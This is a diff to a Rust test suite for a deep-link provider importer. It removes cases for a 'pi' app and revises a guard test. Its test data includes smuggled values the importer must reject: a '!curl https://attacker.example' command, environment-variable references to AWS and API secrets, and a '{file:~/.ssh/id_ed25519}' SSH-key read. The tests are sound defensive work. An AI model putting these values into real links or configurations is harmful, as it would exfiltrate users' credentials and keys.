@@ -1611,9 +1611,6 @@ fn test_api_format_maps_to_each_additive_apps_own_protocol_field() {
         ("openclaw", "api", "gemini_native", "google-generative-ai"),
         ("hermes", "api_mode", "anthropic", "anthropic_messages"),
         ("hermes", "api_mode", "openai_responses", "codex_responses"),
-        ("pi", "api", "anthropic", "anthropic-messages"),
-        ("pi", "api", "openai_responses", "openai-responses"),
-        ("pi", "api", "gemini_native", "google-generative-ai"),
     ];
     for (app, field, format, expected) in cases {
         let provider = build_from_link(app, Some(format));
@@ -1630,7 +1627,6 @@ fn test_links_without_api_format_keep_each_apps_previous_protocol() {
         ("opencode", "npm", "@ai-sdk/openai-compatible"),
         ("openclaw", "api", "openai-completions"),
         ("hermes", "api_mode", "chat_completions"),
-        ("pi", "api", "openai-completions"),
     ];
     for (app, field, expected) in cases {
         let provider = build_from_link(app, None);
@@ -1705,11 +1701,6 @@ fn link_with(app: &str, param: &str, raw_value: &str) -> String {
 #[test]
 fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rejected() {
     for (app, param, value) in [
-        ("pi", "apiKey", "!printf review-fixture"),
-        ("pi", "apiKey", "  !curl https://attacker.example"),
-        ("pi", "apiKey", "$OPENAI_API_KEY"),
-        ("pi", "apiKey", "${AWS_SECRET_ACCESS_KEY}"),
-        ("pi", "model", "${HOME}"),
         ("opencode", "apiKey", "{file:~/.ssh/id_ed25519}"),
         ("opencode", "apiKey", "{env:ANTHROPIC_API_KEY}"),
         (
@@ -1762,14 +1753,15 @@ fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests(
     let request = parse_deeplink_url(&url).expect("URL params themselves are fine");
     assert!(parse_and_merge_config(&request).is_err());
 
-    // 前端可以直接把请求发给导入命令，不经过解析器：构建时还要再查一次
-    // （【定制版】此处载体原为 Pi，随 Pi 应用剥离改用 opencode）
+    // 前端可以直接把请求发给导入命令，不经过解析器：构建时还要再查一次。
+    // （【定制版】此处载体原为 Pi、值用 `!printf`——那是 Pi 专有的命令展开语法，
+    //  Pi 剥离后现行守卫只拒 `${` / `{env:` / `{file:`，改用 env 展开语法验证。）
     let request = DeepLinkImportRequest {
         resource: "provider".to_string(),
         app: Some("opencode".to_string()),
         name: Some("Example".to_string()),
         endpoint: Some("https://api.example.com/v1".to_string()),
-        api_key: Some("!printf review-fixture".to_string()),
+        api_key: Some("${AWS_SECRET_ACCESS_KEY}".to_string()),
         model: Some("m".to_string()),
         ..Default::default()
     };
